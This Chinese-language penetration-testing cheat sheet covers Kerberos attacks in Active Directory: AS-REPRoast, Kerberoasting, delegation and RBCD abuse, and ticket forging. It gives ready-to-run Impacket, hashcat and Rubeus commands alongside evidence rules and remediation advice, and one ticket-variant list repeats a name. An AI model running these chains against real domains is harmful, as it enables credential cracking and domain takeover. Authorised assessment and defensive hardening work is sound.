# Kerberos 攻击（AS-REP / Kerberoast / 委派 / 票据）

> 共同点：**离线破解或票据伪造**。前者依赖弱口令与弱加密类型，后者依赖密钥窃取。

## 一、AS-REPRoast

前提：账号未要求 Kerberos 预认证（`DONT_REQ_PREAUTH`）。

```bash
# 无凭据（需用户名列表）
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc> -format hashcat -outputfile asrep.txt
# 有凭据（枚举全域）
GetNPUsers.py <domain>/<user>:<pass> -request -dc-ip <dc> -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

证据：`$krb5asrep$23$...` 哈希 + 破解出明文（或明确说明"可离线爆破 + 加密类型为 RC4"）。

## 二、Kerberoast

前提：存在注册了 SPN 的用户账号（服务账号），且可请求 TGS。

```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt wordlist.txt        # RC4 etype 23 快
hashcat -m 19700 tgs.txt wordlist.txt        # AES etype 18 慢（需要明文口令派生）
```

要点：

- 高价值目标：`MSSQLSvc/*`、`HTTP/*`、备份/监控系统账号（通常有高权限）。
- AES-only 环境爆破代价高 → 优先寻找 RC4 降级（`msDS-SupportedEncryptionTypes` 含 RC4）。
- **不要求 SPN 也能 Kerberoast**（SPN-less）：把任意用户设置为某服务的 `msDS-AllowedToActOnBehalfOfOtherIdentity`（RBCD）后可对其发起。
- **Hash shucking**：用已有 NT 哈希作为候选口令去校验 RC4 票（`-m 35300` / `35400` / 27100 等），比爆破口令空间快约两个量级；仅对 RC4 有效（AES 由口令 PBKDF2 派生，不能用 NT 哈希）。

## 三、委派攻击

| 类型 | 关键属性 | 利用 |
|---|---|---|
| 非约束委派 | `TRUSTED_FOR_DELEGATION` | 诱使目标服务访问我们 → 抓其 TGT（PrinterBug/Coerce + 监听） |
| 约束委派 | `msDS-AllowedToDelegateTo` | 用 `S4U2Self` + `S4U2Proxy` 以任意用户身份访问指定 SPN |
| 协议转换 | 约束委派 + `TRUSTED_TO_AUTH_FOR_DELEGATION` | 可直接拿到目标服务的可用票据 |
| RBCD | 目标对象 `msDS-AllowedToActOnBehalfOfOtherIdentity` 可写 | 把攻击者控制的机器账号写入 → 完全模拟任意用户访问目标 |

RBCD 最小流程：

```bash
# 1. 需要一台可控机器账号（普通用户默认可创建 10 台：MachineAccountQuota）
addcomputer.py -computer-name 'ATTACK$' -computer-pass 'Passw0rd!' -dc-ip <dc> <domain>/<user>:<pass>
# 2. 写入 RBCD（需对目标对象有写权限，或用 CVE 类滥用）
rbcd.py -delegate-from 'ATTACK$' -delegate-to 'TARGET$' -action write -dc-ip <dc> <domain>/<user>:<pass>
# 3. 用 getST 获取目标服务票据
getST.py -spn cifs/target.<domain> -impersonate administrator -dc-ip <dc> <domain>/'ATTACK$':'Passw0rd!'
export KRB5CCNAME=administrator.ccache; smbclient //target.<domain>/C$ -k -no-pass
```

前提提醒：目标必须允许 SPN-less RBCD 或有可写属性；Windows 补丁会影响部分路径。

## 四、票据相关

- **Pass the Ticket / Overpass the Hash**：
  ```bash
  Rubeus.exe asktgt /user:<u> /rc4:<NThash> /ptt        # Overpass the Hash
  Rubeus.exe ptt /ticket:<base64>                       # PtT
  ```
- **票据窃取**：`Rubeus triage` / `dump`；Linux 侧 `ticketConverter.py`、读取 `/tmp/krb5cc_*`。
- **Golden Ticket**：需要 `krbtgt` 哈希（两次以支持轮换后仍有效），可伪造任意用户（含不存在的用户）。
- **Silver Ticket**：需要**服务账号**哈希；只影响该 SPN 对应服务（隐蔽性高，因为不接触 DC）。
- **Sapphire / Diamond / Sapphire**：PAC 相关变体，用于规避检测或在无完整密钥时伪造。
- **票据加密类型降级**：强制 RC4 请求以获得可爆破票据。

## 五、验证（最小证据）

1. 采集阶段：完整哈希/票据原文（掩码可接受）+ 请求命令。
2. 破解阶段：`hashcat --show` 结果或"已用哈希 shucking 命中"的证据。
3. 权限阶段：以目标身份访问**只读**资源（如 `C$` 目录列表、某个业务接口），不做修改。
4. 委派/RBCD：给出属性写入前后（`ldapsearch` 输出）+ 获得的票据 + 使用该票据的身份证明。

## 六、常见误报

- 票据可获取但破解不出（口令强）→ 不要记"高危破解成功"。
- RBCD 写入失败（权限不足或被补丁阻断）。
- Golden Ticket 环境里 `krbtgt` 已被轮换（旧哈希仍可用但需注意）。
- 伪造票据被 PKINIT/强认证策略拒绝。

## 七、修复

- 服务账号用 **gMSA**（自动轮换 240 字符口令），消除可爆破的长期口令。
- 禁用 RC4，强制 AES；禁用 `DONT_REQ_PREAUTH`（除非必需）。
- 撤销不必要的委派；审查 `MachineAccountQuota`（设为 0）。
- `krbtgt` 定期轮换（两次）；监控 4769（RC4）、4768、4624 类型 3 异常。
- 特权分层：域管账号只能在 Tier0 主机登录。

## 参考

- HackTricks：Kerberos / Kerberoast / ASREPRoast / Delegation；adsecurity.org 票据系列
- GhostPack（Rubeus）、Impacket（GetUserSPNs/GetNPUsers/getST/rbcd）
- Hash Shucking 与 NT-candidate 模式（Hashcat 35300/35400/27100/31600）
